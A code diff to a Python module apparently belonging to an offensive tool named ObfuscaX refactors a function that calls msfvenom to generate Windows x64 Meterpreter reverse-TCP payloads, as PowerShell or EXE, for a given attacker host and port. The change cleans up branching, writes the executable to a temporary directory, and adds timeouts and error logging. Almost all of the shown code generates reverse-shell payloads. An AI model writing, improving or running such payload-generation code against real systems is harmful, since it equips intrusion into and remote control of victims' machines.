@@ -1,7 +1,10 @@
-import subprocess
 import logging
+import os
+import subprocess
+import tempfile
 
 logger = logging.getLogger("ObfuscaX")
+
 
 def generate_payload(payload_type, lhost, lport, use_msf=False):
     """
@@ -16,38 +19,39 @@ def generate_payload(payload_type, lhost, lport, use_msf=False):
             return b"Dummy EXE Payload"
         else:
             raise ValueError("Unsupported payload type")
-    
-    if payload_type == "ps1":
-        logger.info("Generating PowerShell payload using msfvenom...")
-        cmd = [
-            "msfvenom",
-            "-p", f"windows/x64/meterpreter/reverse_tcp",
-            f"LHOST={lhost}",
-            f"LPORT={lport}",
-            "-f", "powershell"
-        ]
-    elif payload_type == "exe":
-        logger.info("Generating EXE payload using msfvenom...")
-        cmd = [
-            "msfvenom",
-            "-p", f"windows/x64/meterpreter/reverse_tcp",
-            f"LHOST={lhost}",
-            f"LPORT={lport}",
-            "-f", "exe",
-            "-o", "payload.exe"
-        ]
-    else:
-        raise ValueError("Unsupported payload type")
+
+    cmd = [
+        "msfvenom",
+        "-p", "windows/x64/meterpreter/reverse_tcp",
+        f"LHOST={lhost}",
+        f"LPORT={lport}",
+    ]
 
     try:
-        if payload_type == "exe":
-            subprocess.run(cmd, check=True)
-            with open("payload.exe", "rb") as f:
-                payload_data = f.read()
-            return payload_data
-        else:
-            result = subprocess.run(cmd, capture_output=True, check=True)
+        if payload_type == "ps1":
+            logger.info("Generating PowerShell payload using msfvenom...")
+            result = subprocess.run(
+                cmd + ["-f", "powershell"], capture_output=True, check=True, timeout=120
+            )
             return result.stdout
-    except Exception as e:
-        logger.error(f"msfvenom payload generation failed: {e}")
+
+        if payload_type == "exe":
+            logger.info("Generating EXE payload using msfvenom...")
+            # Temp file avoids a fixed payload.exe in the working directory.
+            with tempfile.TemporaryDirectory() as tmp:
+                out = os.path.join(tmp, "payload.exe")
+                subprocess.run(
+                    cmd + ["-f", "exe", "-o", out],
+                    capture_output=True, check=True, timeout=120,
+                )
+                with open(out, "rb") as f:
+                    return f.read()
+
+        raise ValueError("Unsupported payload type")
+
+    except subprocess.CalledProcessError as e:
+        logger.error(f"msfvenom failed: {e.stderr.decode(errors='replace')}")
+        raise
+    except subprocess.TimeoutExpired:
+        logger.error("msfvenom timed out after 120 seconds.")
         raise
